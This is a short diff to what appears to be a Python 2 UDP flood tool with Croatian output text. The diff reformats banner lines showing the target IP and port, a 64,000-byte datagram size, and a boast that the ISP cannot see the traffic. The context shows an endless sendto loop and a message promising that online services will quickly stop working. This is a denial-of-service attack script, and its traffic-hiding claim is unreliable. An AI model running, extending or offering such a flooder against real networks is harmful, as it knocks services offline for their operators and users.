@@ -37,9 +37,16 @@ if pitanje.lower() == "y":
     print " "
     print "Mreža se flooda velikim UDP datagramima, očekivan prestanak rada online servisa u jako kratkom vremenu."
     print " "
-    print "|| Veličina UDP datagrama - " + CYAN + "64.000B" + WHITE + " ||"
-    print "|| IP - " + CYAN + "192.168.1.1:80" + WHITE + " ||"
-    print "|| " + CYAN + "ISP NE VIDI OVAJ PROMET! " + WHITE + "||"
+    text = "Veličina UDP datagrama - "
+    value = "64.000B"
+    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"
+
+    text = "IP - "
+    value = "192.168.1.1:80"
+    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"
+
+    text = "ISP NE VIDI OVAJ PROMET!"
+    print "||" + (CYAN + text + WHITE).center(WIDTH) + "||"
     def sender():
         while True:
             sock.sendto(bytes, (ip, port))
